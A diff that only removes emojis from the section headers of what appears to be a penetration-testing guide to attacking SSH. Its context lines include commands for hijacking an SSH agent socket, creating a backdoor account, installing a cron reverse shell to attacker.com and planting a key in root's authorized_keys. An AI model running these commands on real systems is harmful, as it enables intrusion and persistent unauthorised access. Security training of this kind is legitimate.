@@ -1,6 +1,6 @@
 # Port 22 - SSH (Secure Shell) - Complete Attack Guide
 
-## 📖 Overview
+## Overview
 
 **Protocol**: SSH (Secure Shell)
 **Port**: 22 (default), often moved to alternate ports
@@ -8,7 +8,7 @@
 **Encryption**: Yes (strong encryption)
 **Authentication**: Password, Public Key, Kerberos, or combinations
 
-## 🎯 Attack Objectives
+## Attack Objectives
 
 - **Credential Theft**: Obtain SSH credentials
 - **Brute Force**: Crack weak passwords
@@ -17,7 +17,7 @@
 - **Session Hijacking**: Hijack active SSH sessions
 - **Man-in-the-Middle**: Intercept SSH connections
 
-## 🔍 Attack Methodology
+## Attack Methodology
 
 ### Phase 1: Discovery and Enumeration
 
@@ -334,7 +334,7 @@ ls -la /tmp/ssh-*/agent.*
 SSH_AUTH_SOCK=/tmp/ssh-xxxxx/agent.12345 ssh user@target
 ```
 
-## 🛡️ Bypass Techniques
+## Bypass Techniques
 
 ### Bypassing SSH Restrictions
 
@@ -397,7 +397,7 @@ sudo /usr/sbin/sshd -p 443
 ssh -p 443 user@target.com
 ```
 
-## 📊 Information Extraction
+## Information Extraction
 
 ### After Successful SSH Access
 
@@ -475,7 +475,7 @@ echo "backdoor:password" | sudo chpasswd
 (crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -
 ```
 
-## 🔐 Security Recommendations
+## Security Recommendations
 
 **For Defenders**:
 1. **Disable Root Login**: `PermitRootLogin no`
@@ -503,7 +503,7 @@ ClientAliveCountMax 2
 AllowUsers user1 user2
 ```
 
-## ⚠️ Common Mistakes
+## Common Mistakes
 
 **Attacker Mistakes**:
 1. **Too Aggressive**: Account lockout, IDS alerts
@@ -519,7 +519,7 @@ AllowUsers user1 user2
 4. **No Fail2Ban**: No rate limiting
 5. **Weak Keys**: Short RSA keys, old algorithms
 
-## 🎯 Practical Attack Scenario
+## Practical Attack Scenario
 
 ```bash
 # Phase 1: Discovery
@@ -559,7 +559,7 @@ ssh -i /home/user/.ssh/id_rsa user@192.168.1.50
 echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
 ```
 
-## 📚 Tools Summary
+## Tools Summary
 
 **Best Tool for Each Task**:
 - **Banner Grabbing**: `ssh-keyscan`, `nmap --script=banner`
@@ -570,14 +570,14 @@ echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
 - **Tunneling**: Native `ssh -L/-R/-D`
 - **File Transfer**: `scp`, `sftp`, `rsync over SSH`
 
-## 🔗 Related Attacks
+## Related Attacks
 
 - **Port 21 (FTP)**: Try same credentials
 - **Port 23 (Telnet)**: Unencrypted alternative
 - **Port 3389 (RDP)**: Windows equivalent
 - **Port 5900 (VNC)**: Remote desktop alternative
 
-## 📖 Further Reading
+## Further Reading
 
 - OpenSSH Documentation: https://www.openssh.com/
 - SSH RFC 4253: https://www.rfc-editor.org/rfc/rfc4253
